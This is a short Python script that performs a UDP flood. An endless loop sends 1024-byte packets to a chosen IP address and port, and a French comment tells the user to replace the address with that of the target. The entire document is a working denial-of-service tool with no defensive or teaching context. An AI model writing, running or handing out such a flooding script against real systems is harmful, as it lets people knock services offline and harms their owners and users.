import socket
import random

def udp_flood(target_ip, target_port):
    udp = socket.getprotobyname("udp")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        s.sendto(b'X' * 1024, (target_ip, target_port))

if __name__ == '__main__':
    target_ip = "192.168.1.100"  # Remplacez par l'adresse IP de la cible
    target_port = 80  # Port cible (HTTP)

    udp_flood(target_ip, target_port)

